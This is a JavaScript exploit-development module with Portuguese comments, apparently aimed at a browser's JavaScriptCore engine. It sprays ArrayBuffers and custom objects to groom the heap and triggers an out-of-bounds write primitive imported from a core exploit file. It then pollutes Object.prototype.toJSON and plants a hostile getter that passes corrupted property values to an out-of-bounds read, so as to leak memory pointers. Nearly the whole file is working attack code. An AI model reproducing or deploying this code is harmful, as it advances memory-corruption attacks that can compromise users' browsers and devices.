// js/script3/testMyComplexObjectGetterRepro.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    oob_read_absolute, // Agora vamos tentar usar!
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GADGET_PROPERTY_NAME = "AAAA_GetterRepro";
export let getter_repro_called_flag = false;
export let getter_repro_this_id_logged = null;
// ... (outras flags globais de exportação podem ser mantidas ou removidas se não usadas diretamente no log final)
export let getter_leak_attempt_results = {};


class MyComplexObject {
    constructor(id) {
        this.id = `MyObj-${id}`;
        this.value1 = 12345;
        this.value2 = "initial_state";
        this.marker = 0xCAFECAFE;
        this.propD = { original_nested_prop: "valD_orig" }; // Alvo para potencial corrupção para ponteiro
        this.propE = [100, 200, 300];                       // Alvo para potencial corrupção para ponteiro
        this.potential_leak_slot = 0x41424344;
    }
}

// Spray de ArrayBuffers para serem alvos de um possível vazamento de ponteiro
const AB_SPRAY_COUNT = 100;
const AB_SPRAY_SIZE = 32;
const AB_SPRAY_PATTERN_DWORD = 0xABCDABCD;
let sprayed_abs = [];

function sprayArrayBuffers() {
    logS3(`Pulverizando ${AB_SPRAY_COUNT} ArrayBuffers de ${AB_SPRAY_SIZE} bytes...`, "info", "sprayArrayBuffers");
    sprayed_abs = [];
    for (let i = 0; i < AB_SPRAY_COUNT; i++) {
        try {
            const ab = new ArrayBuffer(AB_SPRAY_SIZE);
            const dv = new DataView(ab);
            for (let j = 0; j < AB_SPRAY_SIZE; j += 4) {
                dv.setUint32(j, AB_SPRAY_PATTERN_DWORD, true);
            }
            // Adicionar uma propriedade para tentar identificar depois, se possível
            ab.spray_id = `SprayedAB-${i}`;
            sprayed_abs.push(ab);
        } catch (e) {
            logS3(`Erro ao pulverizar ArrayBuffer ${i}: ${e.message}`, "warn", "sprayArrayBuffers");
            break;
        }
    }
    logS3(`${sprayed_abs.length} ArrayBuffers pulverizados.`, "info", "sprayArrayBuffers");
}

function cleanupSprayedArrayBuffers() {
    logS3(`Limpando ${sprayed_abs.length} ArrayBuffers pulverizados...`, "info", "cleanupSprayedArrayBuffers");
    sprayed_abs = []; // Permitir GC
    globalThis.gc?.();
}


export function toJSON_TriggerGetterViaForIn() { // Mesma função toJSON
    const FNAME_toJSON = "toJSON_TriggerGetterViaForIn";
    let returned_payload = {
        _variant_: FNAME_toJSON,
        _id_at_entry_: (this && this.id !== undefined ? String(this.id) : "N/A"),
    };
    let iteration_count = 0;
    try {
        if (typeof this === 'object' && this !== null) {
            for (const prop in this) {
                iteration_count++;
                if (Object.prototype.hasOwnProperty.call(this, prop) || MyComplexObject.prototype.hasOwnProperty(prop)) {
                     // A lógica aqui é crucial: JSON.stringify vai tentar ler o valor de 'prop'
                     // do objeto 'this' para colocar em 'returned_payload'.
                     // Se 'prop' for o nosso getter, ele é executado.
                    returned_payload[prop] = this[prop];
                }
                if (iteration_count > 100) {
                    logS3(`[${FNAME_toJSON}] Loop excedeu 100 iterações. ID: ${this.id}`, "warn", FNAME_toJSON);
                    returned_payload._LOOP_BREAK_ = iteration_count;
                    break;
                }
            }
        } else {
            returned_payload._ERROR_ = "this is not an object or is null";
        }
    } catch (e) {
        logS3(`[${FNAME_toJSON}] ERRO no loop for...in: ${e.name} - ${e.message}`, "error", FNAME_toJSON);
        if (returned_payload) returned_payload._ERROR_IN_LOOP_ = `${e.name}: ${e.message}`;
    }
    if (returned_payload && iteration_count > 0) {
        returned_payload._iterations_ = iteration_count;
    }
    return returned_payload;
}

export async function executeGetterTriggerReproTest() {
    const FNAME_TEST = "executeGetterTriggerReproTest_SprayAB";
    logS3(`--- Iniciando Teste: Getter com Spray de AB e Tentativa de Leitura de Ponteiro ---`, "test", FNAME_TEST);
    document.title = `Repro MyComplex Getter - Leak Attempt`;

    getter_repro_called_flag = false;
    getter_leak_attempt_results = { success: false, details: "Not called" };

    let originalGetterDescriptor = Object.getOwnPropertyDescriptor(MyComplexObject.prototype, GADGET_PROPERTY_NAME);
    let getterPollutionApplied = false;

    try {
        logS3(`Definindo getter '${GADGET_PROPERTY_NAME}' em MyComplexObject.prototype...`, 'info', FNAME_TEST);
        Object.defineProperty(MyComplexObject.prototype, GADGET_PROPERTY_NAME, {
            get: function() { // ESTE É O GETTER
                const GETTER_FNAME = "MyComplexObject_EvilGetter_LeakAttempt";
                getter_repro_called_flag = true;
                getter_repro_this_id_logged = this.id; // Para log externo
                const results = { id: this.id, getter_called_successfully: true, propD_type: typeof this.propD, propE_type: typeof this.propE };

                logS3(`!!!! GETTER LEAK ATTEMPT '${GADGET_PROPERTY_NAME}' FOI CHAMADO !!!! this.id: ${this.id}`, "vuln", GETTER_FNAME);
                logS3(`   [${GETTER_FNAME}] Verificando 'this' (ID: ${this.id}): instanceof MyComplexObject: ${this instanceof MyComplexObject}, toString: ${Object.prototype.toString.call(this)}`, "info", GETTER_FNAME);

                try {
                    this.marker = 0x1EEA7BAD; // Indicar que o getter foi chamado
                    results.marker_set_to = toHex(this.marker);

                    // Inspecionar this.propD e this.propE
                    logS3(`   [${GETTER_FNAME}] Inspecionando this.propD: ${String(this.propD)} (typeof: ${typeof this.propD})`, "info", GETTER_FNAME);
                    results.propD_value_str = String(this.propD);
                    if (typeof this.propD === 'number' || isAdvancedInt64Object(this.propD)) {
                        const potential_ptr_d = isAdvancedInt64Object(this.propD) ? this.propD : new AdvancedInt64(this.propD);
                        logS3(`     this.propD é numérico/AdvancedInt64: ${potential_ptr_d.toString(true)}. Tentando ler com oob_read_absolute...`, "leak", GETTER_FNAME);
                        try {
                            const leaked_val_d = oob_read_absolute(potential_ptr_d, 8); // Ler 8 bytes
                            if (isAdvancedInt64Object(leaked_val_d)) {
                                logS3(`       LEAK VIA PROP_D: oob_read_absolute(${potential_ptr_d.toString(true)}) retornou ${leaked_val_d.toString(true)}`, "critical", GETTER_FNAME);
                                results.propD_leaked_qword = leaked_val_d.toString(true);
                                results.success = true; // Marcamos sucesso se conseguirmos ler algo
                            } else {
                                logS3(`       LEAK VIA PROP_D: oob_read_absolute(${potential_ptr_d.toString(true)}) retornou ${toHex(leaked_val_d)} (não é AdvInt64)`, "warn", GETTER_FNAME);
                                results.propD_leaked_raw = toHex(leaked_val_d);
                            }
                        } catch (e_read_d) {
                            logS3(`       ERRO ao usar oob_read_absolute em this.propD: ${e_read_d.message}`, "error", GETTER_FNAME);
                            results.propD_read_error = e_read_d.message;
                        }
                    }

                    logS3(`   [${GETTER_FNAME}] Inspecionando this.propE: ${String(this.propE)} (typeof: ${typeof this.propE}, isArray: ${Array.isArray(this.propE)})`, "info", GETTER_FNAME);
                    results.propE_value_str = String(this.propE);
                     if (typeof this.propE === 'number' || isAdvancedInt64Object(this.propE)) {
                        const potential_ptr_e = isAdvancedInt64Object(this.propE) ? this.propE : new AdvancedInt64(this.propE);
                        logS3(`     this.propE é numérico/AdvancedInt64: ${potential_ptr_e.toString(true)}. Tentando ler com oob_read_absolute...`, "leak", GETTER_FNAME);
                        try {
                            const leaked_val_e = oob_read_absolute(potential_ptr_e, 8); // Ler 8 bytes
                             if (isAdvancedInt64Object(leaked_val_e)) {
                                logS3(`       LEAK VIA PROP_E: oob_read_absolute(${potential_ptr_e.toString(true)}) retornou ${leaked_val_e.toString(true)}`, "critical", GETTER_FNAME);
                                results.propE_leaked_qword = leaked_val_e.toString(true);
                                results.success = true; // Marcamos sucesso
                            } else {
                                logS3(`       LEAK VIA PROP_E: oob_read_absolute(${potential_ptr_e.toString(true)}) retornou ${toHex(leaked_val_e)} (não é AdvInt64)`, "warn", GETTER_FNAME);
                                results.propE_leaked_raw = toHex(leaked_val_e);
                            }
                        } catch (e_read_e) {
                            logS3(`       ERRO ao usar oob_read_absolute em this.propE: ${e_read_e.message}`, "error", GETTER_FNAME);
                            results.propE_read_error = e_read_e.message;
                        }
                    }


                } catch (e_getter_main) {
                    logS3(`   [${GETTER_FNAME}] ERRO GERAL DENTRO DO GETTER (ID: ${this.id}): ${e_getter_main.name} - ${e_getter_main.message}`, "error", GETTER_FNAME);
                    results.getter_internal_error = e_getter_main.message;
                }
                getter_leak_attempt_results = results; // Armazena os resultados da última chamada
                return "value_from_leak_attempt_getter";
            },
            configurable: true,
            enumerable: true
        });
        getterPollutionApplied = true;
        logS3("Getter (Leak Attempt) definido com sucesso.", "good", FNAME_TEST);

    } catch (e_getter_setup) {
        logS3(`ERRO ao definir getter (Leak Attempt): ${e_getter_setup.message}`, "error", FNAME_TEST);
        return { errorOccurred: e_getter_setup, results: getter_leak_attempt_results };
    }

    // --- Spray de Objetos e Configuração OOB ---
    sprayArrayBuffers(); // Pulverizar ABs antes dos MyComplexObjects
    await PAUSE_S3(SHORT_PAUSE_S3);


    const spray_count_mycomplex = 50;
    const sprayed_mycomplex_objects = [];
    const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16;
    const value_to_write_in_oob_ab = 0xFFFFFFFF;
    const bytes_to_write_oob_val = 4;

    logS3(`1. Pulverizando ${spray_count_mycomplex} instâncias de MyComplexObject...`, "info", FNAME_TEST);
    try {
        for (let i = 0; i < spray_count_mycomplex; i++) {
            sprayed_mycomplex_objects.push(new MyComplexObject(i));
        }
        logS3(`   Pulverização de ${sprayed_mycomplex_objects.length} MyComplexObjects concluída.`, "good", FNAME_TEST);
    } catch (e_spray_mc) {
        logS3(`Spray MyComplexObject error: ${e_spray_mc.message}`, "error", FNAME_TEST);
        // Cleanup
        if (getterPollutionApplied && MyComplexObject.prototype.hasOwnProperty(GADGET_PROPERTY_NAME)) {
            if (originalGetterDescriptor) Object.defineProperty(MyComplexObject.prototype, GADGET_PROPERTY_NAME, originalGetterDescriptor);
            else delete MyComplexObject.prototype[GADGET_PROPERTY_NAME];
        }
        cleanupSprayedArrayBuffers();
        return { errorOccurred: e_spray_mc, results: getter_leak_attempt_results };
    }

    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`2. Configurando OOB e escrevendo 0xFFFFFFFF em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]...`, "info", FNAME_TEST);
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("OOB setup error", "error", FNAME_TEST);
        // Cleanup
        if (getterPollutionApplied && MyComplexObject.prototype.hasOwnProperty(GADGET_PROPERTY_NAME)) {
             if (originalGetterDescriptor) Object.defineProperty(MyComplexObject.prototype, GADGET_PROPERTY_NAME, originalGetterDescriptor);
             else delete MyComplexObject.prototype[GADGET_PROPERTY_NAME];
        }
        cleanupSprayedArrayBuffers();
        return { errorOccurred: new Error("OOB Setup Failed"), results: getter_leak_attempt_results };
    }

    try {
        oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
        logS3(`   Escrita OOB realizada.`, "info", FNAME_TEST);
    } catch (e_write) {
        logS3(`OOB write error: ${e_write.message}`, "error", FNAME_TEST);
        clearOOBEnvironment();
        // Cleanup
        if (getterPollutionApplied && MyComplexObject.prototype.hasOwnProperty(GADGET_PROPERTY_NAME)) {
            if (originalGetterDescriptor) Object.defineProperty(MyComplexObject.prototype, GADGET_PROPERTY_NAME, originalGetterDescriptor);
            else delete MyComplexObject.prototype[GADGET_PROPERTY_NAME];
        }
        cleanupSprayedArrayBuffers();
        return { errorOccurred: e_write, results: getter_leak_attempt_results };
    }

    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`3. Sondando MyComplexObjects pulverizados com ${toJSON_TriggerGetterViaForIn.name}...`, "test", FNAME_TEST);

    const ppKey_val = 'toJSON';
    let originalToJSONProtoDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let toJSONPollutionApplied = false;
    let problem_detected_summary = null;
    let final_results_from_getter = null; // Para armazenar os resultados do getter se ele for chamado

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_TriggerGetterViaForIn,
            writable: true, configurable: true, enumerable: false
        });
        toJSONPollutionApplied = true;

        const objectsToProbe = Math.min(sprayed_mycomplex_objects.length, 10);
        logS3(`   Sondando os primeiros ${objectsToProbe} MyComplexObjects...`, 'info', FNAME_TEST);
        for (let i = 0; i < objectsToProbe; i++) {
            const obj = sprayed_mycomplex_objects[i];
            if (!obj) continue;

            getter_repro_called_flag = false; // Reset para este objeto
            getter_leak_attempt_results = { success: false, details: "Not called or no leak" }; // Reset

            const original_marker_before_stringify = obj.marker;

            document.title = `Sondando MyComplexObject ${i} (Leak Attempt)`;
            let stringifyResult = null;
            let errorDuringStringify = null;

            logS3(`   Testando MyComplexObject ${i} (ID: ${obj.id}). Marker Original: ${toHex(original_marker_before_stringify)}`, 'info', FNAME_TEST);
            try {
                stringifyResult = JSON.stringify(obj);
                logS3(`     JSON.stringify(obj[${i}]) completou. Retorno da toJSON: ${JSON.stringify(stringifyResult)}`, "info", FNAME_TEST);
                 if (stringifyResult && stringifyResult._ERROR_IN_LOOP_) {
                    errorDuringStringify = new Error(stringifyResult._ERROR_IN_LOOP_);
                }
            } catch (e_str) {
                errorDuringStringify = e_str;
                logS3(`     !!!! ERRO AO STRINGIFY obj[${i}] !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
                if (e_str.stack) logS3(`       Stack: ${e_str.stack}`, "error", FNAME_TEST);
            }

            if (getter_repro_called_flag) {
                logS3(`   !!!! SUCESSO (Parcial): Getter LEAK ATTEMPT FOI CHAMADO para obj.id=${getter_repro_this_id_logged} (original index ${i})!!!!`, "vuln", FNAME_TEST);
                final_results_from_getter = getter_leak_attempt_results; // Salva os resultados detalhados

                if (final_results_from_getter.success) {
                    logS3(`        POTENCIAL LEAK DETECTADO DENTRO DO GETTER! Detalhes: ${JSON.stringify(final_results_from_getter)}`, "critical", FNAME_TEST);
                    document.title = `LEAK? Getter Called on ${obj.id}!`;
                } else {
                     logS3(`        Getter chamado, mas sem vazamento óbvio via oob_read_absolute. Detalhes: ${JSON.stringify(final_results_from_getter)}`, "warn", FNAME_TEST);
                }
                logS3(`        Objeto original (ID ${obj.id}) marker APÓS stringify: ${toHex(obj.marker)} (esperado ${toHex(0x1EEA7BAD)})`, "info", FNAME_TEST);
                if (obj.marker === 0x1EEA7BAD) {
                    logS3(`        CONFIRMADO: MyComplexObject[${i}] (ID: ${obj.id}) teve seu 'marker' modificado pelo getter.`, "good", FNAME_TEST);
                }
                problem_detected_summary = final_results_from_getter.success ? "Getter Acionado COM LEAK ESPECULATIVO" : "Getter Acionado SEM LEAK ÓBVIO";
                break;
            }
            if (errorDuringStringify) {
                logS3(`   ERRO durante sondagem de obj[${i}]: ${errorDuringStringify.name} ${errorDuringStringify.message ? `- ${errorDuringStringify.message}`:''}`, "error", FNAME_TEST);
                problem_detected_summary = `Erro: ${errorDuringStringify.name}`;
                document.title = `ERROR ${errorDuringStringify.name} on ${obj.id}`;
                break;
            }
            await PAUSE_S3(SHORT_PAUSE_S3);
        }
    } catch (e_main_loop) {
        logS3(`Erro no loop principal de sondagem: ${e_main_loop.message}`, "error", FNAME_TEST);
        problem_detected_summary = "Erro no Loop Principal";
    } finally {
        if (toJSONPollutionApplied) {
            if (originalToJSONProtoDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDescriptor);
            else delete Object.prototype[ppKey_val];
        }
    }

    if (getter_repro_called_flag) {
        logS3(`Teste CONCLUÍDO: O Getter LEAK ATTEMPT FOI ACIONADO! Resultado da tentativa de leak:`, "vuln", FNAME_TEST);
        logS3(JSON.stringify(final_results_from_getter, null, 2), "leak", FNAME_TEST); // Log formatado
    } else if (problem_detected_summary) {
        logS3(`Teste CONCLUÍDO: Um problema (${problem_detected_summary}) ocorreu.`, "warn", FNAME_TEST);
    } else {
        logS3("Teste CONCLUÍDO: Getter (Leak Attempt) não acionado.", "good", FNAME_TEST);
    }

    // Cleanup
    if (getterPollutionApplied && MyComplexObject.prototype.hasOwnProperty(GADGET_PROPERTY_NAME)) {
        if (originalGetterDescriptor) Object.defineProperty(MyComplexObject.prototype, GADGET_PROPERTY_NAME, originalGetterDescriptor);
        else delete MyComplexObject.prototype[GADGET_PROPERTY_NAME];
        logS3(`Getter '${GADGET_PROPERTY_NAME}' restaurado/removido de MyComplexObject.prototype.`, "info", FNAME_TEST);
    }
    cleanupSprayedArrayBuffers();
    logS3(`--- Teste Getter com Spray de AB e Tentativa de Leitura de Ponteiro CONCLUÍDO ---`, "test", FNAME_TEST);
    clearOOBEnvironment();
    sprayed_mycomplex_objects.length = 0;
    document.title = problem_detected_summary || (getter_repro_called_flag ? "Getter Leak Done" : "Getter Leak Attempt Done (No Call)");
}
